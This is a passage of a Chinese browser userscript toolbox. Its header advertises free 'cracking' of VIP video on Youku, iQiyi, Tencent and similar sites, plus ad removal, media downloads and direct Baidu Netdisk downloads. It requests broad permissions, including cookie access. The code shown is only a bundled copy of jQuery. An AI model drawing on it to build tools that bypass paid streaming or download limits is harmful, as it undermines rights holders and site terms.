// ==UserScript==
// @name         全网VIP视频免费破解去广告、全网音乐直接下载、知乎增强、短视频无水印下载、百度网盘直接下载等多功能工具箱，功能可独立开关。长期更新，放心使用
// @namespace 	 VIP01
// @version      5.1.1
// @description  自用多功能脚本工具箱，完全免费、无广告、无需关注公众号，集合了优酷、爱奇艺、腾讯、B站(bilibili)、芒果等全网VIP视频(PC+移动端)免费破解去广告，网易云音乐、QQ音乐、酷狗、酷我、虾米、蜻蜓FM、荔枝FM、喜马拉雅等网站音乐和有声书音频免客户端下载，知乎增强(知乎视频下载、去广告、关键词屏蔽、去除侧边栏等)，视频无水印下载(bilibili、抖音、快手、西瓜)，百度网盘直接下载，优惠券自动查询等几个自己常用的功能，且功能可独立开关。
// @author       只要平淡
// @icon         data:image/png;base64,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
// @match        *://pan.baidu.com/disk/home*
// @match        *://yun.baidu.com/disk/home*
// @match        *://pan.baidu.com/disk/main*
// @match        *://yun.baidu.com/disk/main*
// @match        *://pan.baidu.com/s*
// @match        *://yun.baidu.com/s*
// @match        *://*.youku.com/*
// @match        *://*.iqiyi.com/*
// @match        *://*.iq.com/*
// @match        *://*.le.com/*
// @match        *://v.qq.com/*
// @match        *://m.v.qq.com/*
// @match        *://*.tudou.com/*
// @match        *://*.mgtv.com/*
// @match        *://tv.sohu.com/*
// @match        *://film.sohu.com/*
// @match        *://*.bilibili.com/*
// @match        *://*.pptv.com/*
// @match        *://item.taobao.com/*
// @match        *://chaoshi.detail.tmall.com/*
// @match        *://detail.tmall.com/*
// @match        *://detail.tmall.hk/*
// @match        *://item.jd.com/*
// @match        *://*.yiyaojd.com/*
// @match        *://*.liangxinyao.com/*
// @match        *://music.163.com/*
// @match        *://y.qq.com/*
// @match        *://*.kugou.com/*
// @match        *://*.kuwo.cn/*
// @match        *://*.ximalaya.com/*
// @match        *://*.zhihu.com/*
// @match        *://*.douyin.com/*
// @match        *://*.kuaishou.com/*
// @match        *://*.ixigua.com/*
// @exclude      *://*.zhmdy.top/*
// @exclude      *://*.eggvod.cn/*
// @connect      d.pcs.baidu.com
// @connect      baidu.com
// @connect      baidupcs.com
// @connect      youxiaohou.com
// @connect      localhost
// @require      https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/crypto-js/4.1.1/crypto-js.min.js
// @require      https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/limonte-sweetalert2/11.4.4/sweetalert2.all.min.js
// @original-script https://greasyfork.org/scripts/376078
// @original-author zhmai
// @original-license GPL License
// @original-script https://github.com/syhyz1990/baiduyun/blob/master/baiduyun.user.js
// @original-author youxiaohou
// @original-license AGPL License
// @original-changes 将强制关注公众号改为非强制。
// @antifeature  referral-link 此提示为GreasyFork代码规范要求含有查券功能的脚本必须添加，实际使用无任何强制跳转，代码可查，请知悉。
// @license      AGPL License
// @grant        GM_download
// @grant        GM_openInTab
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// @grant        unsafeWindow
// @grant        GM_setClipboard
// @grant        GM_getResourceURL
// @grant        GM_getResourceText
// @grant        GM_info
// @grant        GM_registerMenuCommand
// @grant        GM_cookie
// @run-at       document-body
// ==/UserScript==
(function (e) {
    var t = {};

    function n(r) {
        if (t[r]) return t[r].exports;
        var i = t[r] = {i: r, l: !1, exports: {}};
        return e[r].call(i.exports, i, i.exports, n), i.l = !0, i.exports
    }

    n.m = e, n.c = t, n.d = function (e, t, r) {
        n.o(e, t) || Object.defineProperty(e, t, {enumerable: !0, get: r})
    }, n.r = function (e) {
        "undefined" !== typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {value: "Module"}), Object.defineProperty(e, "__esModule", {value: !0})
    }, n.t = function (e, t) {
        if (1 & t && (e = n(e)), 8 & t) return e;
        if (4 & t && "object" === typeof e && e && e.__esModule) return e;
        var r = Object.create(null);
        if (n.r(r), Object.defineProperty(r, "default", {
            enumerable: !0,
            value: e
        }), 2 & t && "string" != typeof e) for (var i in e) n.d(r, i, function (t) {
            return e[t]
        }.bind(null, i));
        return r
    }, n.n = function (e) {
        var t = e && e.__esModule ? function () {
            return e["default"]
        } : function () {
            return e
        };
        return n.d(t, "a", t), t
    }, n.o = function (e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, n.p = "/", n(n.s = 0)
})({
    0: function (e, t, n) {
        n("56d7"), n("170c"), n("6d37"), n("3ed4"), n("d72b"), e.exports = n("1112")
    }, 1112: function (e, t) {
    }, "170c": function (e, t, n) {
        var r, i;
        (function (o, a) {
            var s, u, l = typeof a, c = o.document, f = o.location, p = o.jQuery, d = o.$, h = {}, m = [], g = "1.9.1",
                y = m.concat, v = m.push, b = m.slice, x = m.indexOf, w = h.toString, T = h.hasOwnProperty, C = g.trim,
                N = function (e, t) {
                    return new N.fn.init(e, t, u)
                }, k = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source, E = /\S+/g,
                S = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, A = /^(?:(<[\w\W]+>)[^>]*|#([\w-]*))$/,
                j = /^<(\w+)\s*\/?>(?:<\/\1>|)$/, D = /^[\],:{}\s]*$/, L = /(?:^|:|,)(?:\s*\[)+/g,
                H = /\\(?:["\\\/bfnrt]|u[\da-fA-F]{4})/g,
                M = /"[^"\\\r\n]*"|true|false|null|-?(?:\d+\.|)\d+(?:[eE][+-]?\d+|)/g, _ = /^-ms-/, q = /-([\da-z])/gi,
                O = function (e, t) {
                    return t.toUpperCase()
                }, F = function (e) {
                    (c.addEventListener || "load" === e.type || "complete" === c.readyState) && (B(), N.ready())
                }, B = function () {
                    c.addEventListener ? (c.removeEventListener("DOMContentLoaded", F, !1), o.removeEventListener("load", F, !1)) : (c.detachEvent("onreadystatechange", F), o.detachEvent("onload", F))
                };

            function R(e) {
                var t = e.length, n = N.type(e);
                return !N.isWindow(e) && (!(1 !== e.nodeType || !t) || ("array" === n || "function" !== n && (0 === t || "number" == typeof t && t > 0 && t - 1 in e)))
            }

            N.fn = N.prototype = {
                jquery: g, constructor: N, init: function (e, t, n) {
                    var r, i;
                    if (!e) return this;
                    if ("string" == typeof e) {
                        if (r = "<" === e.charAt(0) && ">" === e.charAt(e.length - 1) && e.length >= 3 ? [null, e, null] : A.exec(e), !r || !r[1] && t) return !t || t.jquery ? (t || n).find(e) : this.constructor(t).find(e);
                        if (r[1]) {
                            if (t = t instanceof N ? t[0] : t, N.merge(this, N.parseHTML(r[1], t && t.nodeType ? t.ownerDocument || t : c, !0)), j.test(r[1]) && N.isPlainObject(t)) for (r in t) N.isFunction(this[r]) ? this[r](t[r]) : this.attr(r, t[r]);
                            return this
                        }
                        if (i = c.getElementById(r[2]), i && i.parentNode) {
                            if (i.id !== r[2]) return n.find(e);
                            this.length = 1, this[0] = i
                        }
                        return this.context = c, this.selector = e, this
                    }
                    return e.nodeType ? (this.context = this[0] = e, this.length = 1, this) : N.isFunction(e) ? n.ready(e) : (e.selector !== a && (this.selector = e.selector, this.context = e.context), N.makeArray(e, this))
                }, selector: "", length: 0, size: function () {
                    return this.length
                }, toArray: function () {
                    return b.call(this)
                }, get: function (e) {
                    return null == e ? this.toArray() : 0 > e ? this[this.length + e] : this[e]
                }, pushStack: function (e) {
                    var t = N.merge(this.constructor(), e);
                    return t.prevObject = this, t.context = this.context, t
                }, each: function (e, t) {
                    return N.each(this, e, t)
                }, ready: function (e) {
                    return N.ready.promise().done(e), this
                }, slice: function () {
                    return this.pushStack(b.apply(this, arguments))
                }, first: function () {
                    return this.eq(0)
                }, last: function () {
                    return this.eq(-1)
                }, eq: function (e) {
                    var t = this.length, n = +e + (0 > e ? t : 0);
                    return this.pushStack(n >= 0 && t > n ? [this[n]] : [])
                }, map: function (e) {
                    return this.pushStack(N.map(this, (function (t, n) {
                        return e.call(t, n, t)
                    })))
                }, end: function () {
                    return this.prevObject || this.constructor(null)
                }, push: v, sort: [].sort, splice: [].splice
            }, N.fn.init.prototype = N.fn, N.extend = N.fn.extend = function () {
                var e, t, n, r, i, o, s = arguments[0] || {}, u = 1, l = arguments.length, c = !1;
                for ("boolean" == typeof s && (c = s, s = arguments[1] || {}, u = 2), "object" == typeof s || N.isFunction(s) || (s = {}), l === u && (s = this, --u); l > u; u++) if (null != (i = arguments[u])) for (r in i) e = s[r], n = i[r], s !== n && (c && n && (N.isPlainObject(n) || (t = N.isArray(n))) ? (t ? (t = !1, o = e && N.isArray(e) ? e : []) : o = e && N.isPlainObject(e) ? e : {}, s[r] = N.extend(c, o, n)) : n !== a && (s[r] = n));
                return s
            }, N.extend({
                noConflict: function (e) {
                    return o.$ === N && (o.$ = d), e && o.jQuery === N && (o.jQuery = p), N
                }, isReady: !1, readyWait: 1, holdReady: function (e) {
                    e ? N.readyWait++ : N.ready(!0)
                }, ready: function (e) {
                    if (!0 === e ? !--N.readyWait : !N.isReady) {
                        if (!c.body) return setTimeout(N.ready);
                        N.isReady = !0, !0 !== e && --N.readyWait > 0 || (s.resolveWith(c, [N]), N.fn.trigger && N(c).trigger("ready").off("ready"))
                    }
                }, isFunction: function (e) {
                    return "function" === N.type(e)
                }, isArray: Array.isArray || function (e) {
                    return "array" === N.type(e)
                }, isWindow: function (e) {
                    return null != e && e == e.window
                }, isNumeric: function (e) {
                    return !isNaN(parseFloat(e)) && isFinite(e)
                }, type: function (e) {
                    return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? h[w.call(e)] || "object" : typeof e
                }, isPlainObject: function (e) {
                    if (!e || "object" !== N.type(e) || e.nodeType || N.isWindow(e)) return !1;
                    try {
                        if (e.constructor && !T.call(e, "constructor") && !T.call(e.constructor.prototype, "isPrototypeOf")) return !1
                    } catch (s) {
                        return !1
                    }
                    var t;
                    for (t in e) ;
                    return t === a || T.call(e, t)
                }, isEmptyObject: function (e) {
                    var t;
                    for (t in e) return !1;
                    return !0
                }, error: function (e) {
                    throw Error(e)
                }, parseHTML: function (e, t, n) {
                    if (!e || "string" != typeof e) return null;
                    "boolean" == typeof t && (n = t, t = !1), t = t || c;
                    var r = j.exec(e), i = !n && [];
                    return r ? [t.createElement(r[1])] : (r = N.buildFragment([e], t, i), i && N(i).remove(), N.merge([], r.childNodes))
                }, parseJSON: function (e) {
                    return o.JSON && o.JSON.parse ? o.JSON.parse(e) : null === e ? e : "string" == typeof e && (e = N.trim(e), e && D.test(e.replace(H, "@").replace(M, "]").replace(L, ""))) ? Function("return " + e)() : (N.error("Invalid JSON: " + e), a)
                }, parseXML: function (e) {
                    var t, n;
                    if (!e || "string" != typeof e) return null;
                    try {
                        o.DOMParser ? (n = new DOMParser, t = n.parseFromString(e, "text/xml")) : (t = new ActiveXObject("Microsoft.XMLDOM"), t.async = "false", t.loadXML(e))
                    } catch (c) {
                        t = a
                    }
                    return t && t.documentElement && !t.getElementsByTagName("parsererror").length || N.error("Invalid XML: " + e), t
                }, noop: function () {
                }, globalEval: function (e) {
                    e && N.trim(e) && (o.execScript || function (e) {
                        o.eval.call(o, e)
                    })(e)
                }, camelCase: function (e) {
                    return e.replace(_, "ms-").replace(q, O)
                }, nodeName: function (e, t) {
                    return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase()
                }, each: function (e, t, n) {
                    var r, i = 0, o = e.length, a = R(e);
                    if (n) {
                        if (a) {
                            for (; o > i; i++) if (r = t.apply(e[i], n), !1 === r) break
                        } else for (i in e) if (r = t.apply(e[i], n), !1 === r) break
                    } else if (a) {
                        for (; o > i; i++) if (r = t.call(e[i], i, e[i]), !1 === r) break
                    } else for (i in e) if (r = t.call(e[i], i, e[i]), !1 === r) break;
                    return e
                }, trim: C && !C.call("\ufeff ") ? function (e) {
                    return null == e ? "" : C.call(e)
                } : function (e) {
                    return null == e ? "" : (e + "").replace(S, "")
                }, makeArray: function (e, t) {
                    var n = t || [];
                    return null != e && (R(Object(e)) ? N.merge(n, "string" == typeof e ? [e] : e) : v.call(n, e)), n
                }, inArray: function (e, t, n) {
                    var r;
                    if (t) {
                        if (x) return x.call(t, e, n);
                        for (r = t.length, n = n ? 0 > n ? Math.max(0, r + n) : n : 0; r > n; n++) if (n in t && t[n] === e) return n
                    }
                    return -1
                }, merge: function (e, t) {
                    var n = t.length, r = e.length, i = 0;
                    if ("number" == typeof n) for (; n > i; i++) e[r++] = t[i]; else while (t[i] !== a) e[r++] = t[i++];
                    return e.length = r, e
                }, grep: function (e, t, n) {
                    var r, i = [], o = 0, a = e.length;
                    for (n = !!n; a > o; o++) r = !!t(e[o], o), n !== r && i.push(e[o]);
                    return i
                }, map: function (e, t, n) {
                    var r, i = 0, o = e.length, a = R(e), s = [];
                    if (a) for (; o > i; i++) r = t(e[i], i, n), null != r && (s[s.length] = r); else for (i in e) r = t(e[i], i, n), null != r && (s[s.length] = r);
                    return y.apply([], s)
                }, guid: 1, proxy: function (e, t) {
                    var n, r, i;
                    return "string" == typeof t && (i = e[t], t = e, e = i), N.isFunction(e) ? (n = b.call(arguments, 2), r = function () {
                        return e.apply(t || this, n.concat(b.call(arguments)))
                    }, r.guid = e.guid = e.guid || N.guid++, r) : a
                }, access: function (e, t, n, r, i, o, s) {
                    var u = 0, l = e.length, c = null == n;
                    if ("object" === N.type(n)) for (u in i = !0, n) N.access(e, t, u, n[u], !0, o, s); else if (r !== a && (i = !0, N.isFunction(r) || (s = !0), c && (s ? (t.call(e, r), t = null) : (c = t, t = function (e, t, n) {
                        return c.call(N(e), n)
                    })), t)) for (; l > u; u++) t(e[u], n, s ? r : r.call(e[u], u, t(e[u], n)));
                    return i ? e : c ? t.call(e) : l ? t(e[0], n) : o
                }, now: function () {
                    return (new Date).getTime()
                }
            }), N.ready.promise = function (e) {
                if (!s) if (s = N.Deferred(), "complete" === c.readyState) setTimeout(N.ready); else if (c.addEventListener) c.addEventListener("DOMContentLoaded", F, !1), o.addEventListener("load", F, !1); else {
                    c.attachEvent("onreadystatechange", F), o.attachEvent("onload", F);
                    var t = !1;
                    try {
                        t = null == o.frameElement && c.documentElement
                    } catch (l) {
                    }
                    t && t.doScroll && function e() {
                        if (!N.isReady) {
                            try {
                                t.doScroll("left")
                            } catch (o) {
                                return setTimeout(e, 50)
                            }
                            B(), N.ready()
                        }
                    }()
                }
                return s.promise(e)
            }, N.each("Boolean Number String Function Array Date RegExp Object Error".split(" "), (function (e, t) {
                h["[object " + t + "]"] = t.toLowerCase()
            })), u = N(c);
            var P = {};

            function W(e) {
                var t = P[e] = {};
                return N.each(e.match(E) || [], (function (e, n) {
                    t[n] = !0
                })), t
            }

            N.Callbacks = function (e) {
                e = "string" == typeof e ? P[e] || W(e) : N.extend({}, e);
                var t, n, r, i, o, s, u = [], l = !e.once && [], c = function (a) {
                    for (n = e.memory && a, r = !0, o = s || 0, s = 0, i = u.length, t = !0; u && i > o; o++) if (!1 === u[o].apply(a[0], a[1]) && e.stopOnFalse) {
                        n = !1;
                        break
                    }
                    t = !1, u && (l ? l.length && c(l.shift()) : n ? u = [] : f.disable())
                }, f = {
                    add: function () {
                        if (u) {
                            var r = u.length;
                            (function t(n) {
                                N.each(n, (function (n, r) {
                                    var i = N.type(r);
                                    "function" === i ? e.unique && f.has(r) || u.push(r) : r && r.length && "string" !== i && t(r)
                                }))
                            })(arguments), t ? i = u.length : n && (s = r, c(n))
                        }
                        return this
                    }, remove: function () {
                        return u && N.each(arguments, (function (e, n) {
                            var r;
                            while ((r = N.inArray(n, u, r)) > -1) u.splice(r, 1), t && (i >= r && i--, o >= r && o--)
                        })), this
                    }, has: function (e) {
                        return e ? N.inArray(e, u) > -1 : !(!u || !u.length)
                    }, empty: function () {
                        return u = [], this
                    }, disable: function () {
                        return u = l = n = a, this
                    }, disabled: function () {
                        return !u
                    }, lock: function () {
                        return l = a, n || f.disable(), this
                    }, locked: function () {
                        return !l
                    }, fireWith: function (e, n) {
                        return n = n || [], n = [e, n.slice ? n.slice() : n], !u || r && !l || (t ? l.push(n) : c(n)), this
                    }, fire: function () {
                        return f.fireWith(this, arguments), this
                    }, fired: function () {
                        return !!r
                    }
                };
                return f
            }, N.extend({
                Deferred: function (e) {
                    var t = [["resolve", "done", N.Callbacks("once memory"), "resolved"], ["reject", "fail", N.Callbacks("once memory"), "rejected"], ["notify", "progress", N.Callbacks("memory")]],
                        n = "pending", r = {
                            state: function () {
                                return n
                            }, always: function () {
                                return i.done(arguments).fail(arguments), this
                            }, then: function () {
                                var e = arguments;
                                return N.Deferred((function (n) {
                                    N.each(t, (function (t, o) {
                                        var a = o[0], s = N.isFunction(e[t]) && e[t];
                                        i[o[1]]((function () {
                                            var e = s && s.apply(this, arguments);
                                            e && N.isFunction(e.promise) ? e.promise().done(n.resolve).fail(n.reject).progress(n.notify) : n[a + "With"](this === r ? n.promise() : this, s ? [e] : arguments)
                                        }))
                                    })), e = null
                                })).promise()
                            }, promise: function (e) {
                                return null != e ? N.extend(e, r) : r
                            }
                        }, i = {};
                    return r.pipe = r.then, N.each(t, (function (e, o) {
                        var a = o[2], s = o[3];
                        r[o[1]] = a.add, s && a.add((function () {
                            n = s
                        }), t[1 ^ e][2].disable, t[2][2].lock), i[o[0]] = function () {
                            return i[o[0] + "With"](this === i ? r : this, arguments), this
                        }, i[o[0] + "With"] = a.fireWith
                    })), r.promise(i), e && e.call(i, i), i
                }, when: function (e) {
                    var t, n, r, i = 0, o = b.call(arguments), a = o.length,
                        s = 1 !== a || e && N.isFunction(e.promise) ? a : 0, u = 1 === s ? e : N.Deferred(),
                        l = function (e, n, r) {
                            return function (i) {
                                n[e] = this, r[e] = arguments.length > 1 ? b.call(arguments) : i, r === t ? u.notifyWith(n, r) : --s || u.resolveWith(n, r)
                            }
                        };
                    if (a > 1) for (t = Array(a), n = Array(a), r = Array(a); a > i; i++) o[i] && N.isFunction(o[i].promise) ? o[i].promise().done(l(i, r, o)).fail(u.reject).progress(l(i, n, t)) : --s;
                    return s || u.resolveWith(r, o), u.promise()
                }
            }), N.support = function () {
                var e, t, n, r, i, a, s, u, f, p, d = c.createElement("div");
                if (d.setAttribute("className", "t"), d.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>", t = d.getElementsByTagName("*"), n = d.getElementsByTagName("a")[0], !t || !n || !t.length) return {};
                i = c.createElement("select"), s = i.appendChild(c.createElement("option")), r = d.getElementsByTagName("input")[0], n.style.cssText = "top:1px;float:left;opacity:.5", e = {
                    getSetAttribute: "t" !== d.className,
                    leadingWhitespace: 3 === d.firstChild.nodeType,
                    tbody: !d.getElementsByTagName("tbody").length,
                    htmlSerialize: !!d.getElementsByTagName("link").length,
                    style: /top/.test(n.getAttribute("style")),
                    hrefNormalized: "/a" === n.getAttribute("href"),
                    opacity: /^0.5/.test(n.style.opacity),
                    cssFloat: !!n.style.cssFloat,
